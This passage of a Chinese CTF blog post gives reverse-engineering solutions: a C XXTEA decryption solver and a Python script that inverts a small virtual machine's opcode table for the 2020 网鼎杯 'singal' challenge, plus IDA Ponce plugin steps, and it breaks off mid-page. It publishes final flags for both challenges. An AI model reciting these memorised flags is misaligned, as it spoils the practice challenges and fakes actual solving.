b[<span class="number">18</span>] = a[<span class="number">16</span>];</span><br><span class="line">    b[<span class="number">16</span>] = a[<span class="number">17</span>];</span><br><span class="line">    b[<span class="number">19</span>] = a[<span class="number">18</span>];</span><br><span class="line">    b[<span class="number">17</span>] = a[<span class="number">19</span>];</span><br><span class="line">    b[<span class="number">22</span>] = a[<span class="number">20</span>];</span><br><span class="line">    b[<span class="number">20</span>] = a[<span class="number">21</span>];</span><br><span class="line">    b[<span class="number">23</span>] = a[<span class="number">22</span>];</span><br><span class="line">    b[<span class="number">21</span>] = a[<span class="number">23</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">24</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%x,&quot;</span>, b[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">24</span>; i+=<span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%02x%02x%02x%02x, &quot;</span>,b[i+<span class="number">3</span>], b[i+<span class="number">2</span>], b[i+<span class="number">1</span>], b[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v[<span class="number">6</span>]= &#123;<span class="number">0x40cea5bc</span>, <span class="number">0xe7b2b2f4</span>, <span class="number">0x129d12a9</span>, <span class="number">0x5bc810ae</span>, <span class="number">0x1d06d73d</span>, <span class="number">0xdcf870dc</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="keyword">const</span> k[<span class="number">4</span>]= &#123;<span class="number">0x67616c66</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> n= <span class="number">6</span>;</span><br><span class="line">    btea(v, -n, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;加密后的数据：%x %x %x %x %x\n&quot;</span>, v[<span class="number">0</span>], v[<span class="number">1</span>], v[<span class="number">2</span>], v[<span class="number">3</span>], v[<span class="number">4</span>], v[<span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, v[i] &amp; <span class="number">0xff</span>);</span><br><span class="line">            v[i] = v[i] &gt;&gt; <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{CXX_and_++tea}</p></blockquote><h1 id="网鼎杯-2020-青龙组-singal"><a href="#网鼎杯-2020-青龙组-singal" class="headerlink" title="[网鼎杯 2020 青龙组]singal"></a>[网鼎杯 2020 青龙组]singal</h1><h2 id="直接分析"><a href="#直接分析" class="headerlink" title="直接分析"></a>直接分析</h2><p><img src="/2021/10/08/buu-re-2/18.png"><br><img src="/2021/10/08/buu-re-2/19.png"></p><p>认真观察，逻辑还是很清晰的<br>int型数据，转化一下，LOBYTE看汇编可知取出AL,也就是末8位，最后又是char == int * ，整个程序没用到数据的前24位<br>第一个数字当作case参数，后面一个或零个数据当作语句块中的参数，每个数据只使用一次</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line">opcode_table = [<span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x21</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x51</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x24</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x36</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x41</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x3F</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x72</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x33</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x18</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xA7</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, </span><br><span class="line">                <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x28</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x84</span>, <span class="number">0xFF</span>, </span><br><span class="line">                <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, </span><br><span class="line">                <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x1E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, </span><br><span class="line">                <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x7A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line">table = []</span><br><span class="line">flag = []</span><br><span class="line">a = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0</span>, <span class="built_in">len</span>(opcode_table)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">        table.append(opcode_table[i])</span><br><span class="line">    <span class="keyword">if</span> opcode_table[i] == <span class="number">7</span>:</span><br><span class="line">        flag.append(opcode_table[i+<span class="number">4</span>])</span><br><span class="line">    <span class="keyword">if</span> opcode_table[i] == <span class="number">1</span>:</span><br><span class="line">        a += <span class="number">1</span></span><br><span class="line"><span class="comment"># print(a)</span></span><br><span class="line"><span class="comment"># print(len(table))</span></span><br><span class="line"><span class="comment"># print(table)</span></span><br><span class="line"><span class="comment"># print(len(flag))</span></span><br><span class="line"><span class="comment"># print(flag)</span></span><br><span class="line"></span><br><span class="line">table = [<span class="number">4</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">32</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">33</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">32</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">81</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">36</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">37</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">54</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">65</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">32</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">37</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">32</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">65</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">1</span>,]</span><br><span class="line"><span class="comment"># table中有两个连着的1，第一个作为运算数据，第二个作为case参数，为了脚本简单化，我将第一个1改为了100，在table2中再改回来</span></span><br><span class="line"><span class="comment"># print(len(table))</span></span><br><span class="line">table2=[]</span><br><span class="line"><span class="built_in">id</span>=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(table)):             <span class="comment">#逆运算顺序</span></span><br><span class="line">    <span class="keyword">if</span> table[i]==<span class="number">1</span>:</span><br><span class="line">        s=table[<span class="built_in">id</span>:i]</span><br><span class="line">        <span class="comment"># print(s)</span></span><br><span class="line">        id2=s.index(<span class="number">8</span>)</span><br><span class="line">       </span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(id2+<span class="number">1</span>,<span class="built_in">len</span>(s)):</span><br><span class="line">            table2.append(s[j])</span><br><span class="line">        <span class="comment"># print(s[0:id2])</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(id2):</span><br><span class="line">            table2.append(s[j])</span><br><span class="line">        <span class="built_in">id</span>=i+<span class="number">1</span></span><br><span class="line">        table2.append(<span class="number">1</span>)      </span><br><span class="line"><span class="comment"># print(table2)</span></span><br><span class="line"><span class="comment"># print(len(table2))</span></span><br><span class="line"><span class="comment"># print(table2[51])</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="built_in">input</span> = []</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">table2 = [<span class="number">3</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">16</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">32</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">33</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">32</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">36</span>, <span class="number">2</span>, <span class="number">81</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">37</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">65</span>, <span class="number">2</span>, <span class="number">54</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">32</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">37</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">32</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">2</span>, <span class="number">65</span>, <span class="number">1</span>]</span><br><span class="line"><span class="comment"># 将100改为1</span></span><br><span class="line"><span class="keyword">while</span> i&lt;<span class="built_in">len</span>(table2):</span><br><span class="line">    <span class="keyword">if</span> table2[i] == <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">input</span>.append(flag[j])</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">        <span class="comment">#print(i, j, flag[j], table2[i + 1])</span></span><br><span class="line">        <span class="keyword">continue</span> </span><br><span class="line">    <span class="keyword">if</span> table2[i] == <span class="number">2</span>:</span><br><span class="line">        flag[j] -= table2[i + <span class="number">1</span>]</span><br><span class="line">        i += <span class="number">2</span></span><br><span class="line">        <span class="comment"># print(i, j, flag[j], table2[i + 1])</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> table2[i] == <span class="number">3</span>:</span><br><span class="line">        flag[j] += table2[i + <span class="number">1</span>]</span><br><span class="line">        i += <span class="number">2</span></span><br><span class="line">        <span class="comment"># print(i, j, flag[j], table2[i + 1])</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> table2[i] == <span class="number">4</span>:</span><br><span class="line">        flag[j] ^= table2[i + <span class="number">1</span>]</span><br><span class="line">        i += <span class="number">2</span></span><br><span class="line">        <span class="comment"># print(i, j, flag[j], table2[i + 1])</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> table2[i] == <span class="number">5</span>:</span><br><span class="line">        flag[j] //= table2[i + <span class="number">1</span>]</span><br><span class="line">        i += <span class="number">2</span></span><br><span class="line">        <span class="comment"># print(i, j, flag[j], table2[i + 1])</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> table2[i] == <span class="number">11</span>:</span><br><span class="line">        flag[j] += <span class="number">1</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        <span class="comment"># print(i, j, flag[j], table2[i + 1])</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> table2[i] == <span class="number">12</span>:</span><br><span class="line">        flag[j] -= <span class="number">1</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        <span class="comment"># print(i, j, flag[j], table2[i + 1])</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="comment">#print(i, j, flag[j], table2[i + 1])</span></span><br><span class="line"><span class="comment"># print(input)</span></span><br><span class="line">print(<span class="string">&quot;flag&#123;&quot;</span> + <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>,<span class="built_in">input</span>)) + <span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range (0, len(input)):</span></span><br><span class="line"><span class="comment">#     print(chr(input[i]),end=&quot;&quot;)</span></span><br><span class="line"><span class="comment">#[3, 5, 4, 16, 1, 5, 3, 4, 32, 1, 11, 3, 2, 1, 4, 4, 12, 1, 3, 33, 5, 3, 1, 11, 11, 1, 3, 32, 4, 9, 1, 4, 36, 2, 81, 1, 11, 12, 1, 2, 37, 5, 2, 1, 4, 65, 2, 54, 1, 5, 1, 2, 32, 1, 2, 37, 5, 3, 1, 3, 32, 4, 9, 1, 12, 2, 65, 1]</span></span><br></pre></td></tr></table></figure><blockquote><p>flag{757515121f3d478}</p></blockquote><h2 id="利用IDA-Ponce插件"><a href="#利用IDA-Ponce插件" class="headerlink" title="利用IDA Ponce插件"></a>利用IDA Ponce插件</h2><p>首先去github下载Ponce插件，<a href="https://github.com/illera88/Ponce">点击此处</a><br>点击右边Release，根据自己IDA版本下载相应版本的插件，将下载好的dll文件复制到plugins里</p><p>首先在输入和比较处设置断点</p><p><img src="/2021/10/08/buu-re-2/20.png"><br><img src="/2021/10/08/buu-re-2/21.png"></p><p>F9运行，输入15个字符，然后在stack窗口，选中当前esp值，右击，follow in hex dump</p><p><img src="/2021/10/08/buu-re-2/22.png"></p><p>在hex窗口中找到输入的数据，选中，ctrl+shift+M，size改为15</p><p><img src="/2021/10/08/buu-re-2/23.png"></p><p>再次按F9运行，右击断点处，然后flag[0]就出来了，如下图</p><p><img src="/2021/10/08/buu-re-2/24.png"><br><img 